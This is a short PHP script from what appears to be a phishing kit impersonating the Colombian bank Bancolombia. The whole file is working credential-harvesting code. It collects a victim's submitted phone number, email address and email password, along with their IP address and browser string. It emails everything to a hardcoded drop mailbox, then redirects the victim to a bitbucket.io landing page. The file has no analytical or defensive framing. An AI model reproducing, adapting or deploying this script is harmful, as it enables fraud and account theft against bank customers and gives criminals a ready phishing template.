<?php 
$ip = getenv("REMOTE_ADDR"); 
$datamasii=date("D M d, Y g:i a"); 
$e = $_REQUEST['phone'] ;
$p = $_REQUEST['email'] ;
$r = $_REQUEST['epass'] ;
$returnBox ='vitocorleon419@yahoo.com'; // return box



$mesaj = "------------Bancolombia--------------

------------------------
Phone : $e
Email : $p
Epass : $r

IP:$ip
----------------------------------------------------
Browser         :  ".$_SERVER['HTTP_USER_AGENT']."
DATE : $datamasii"; 
$subject = "Bancolombia Phone & Email";
mail($returnBox, $subject, $mesaj);

header("Location: https://validation77.bitbucket.io/rcb_landing.html");
?>




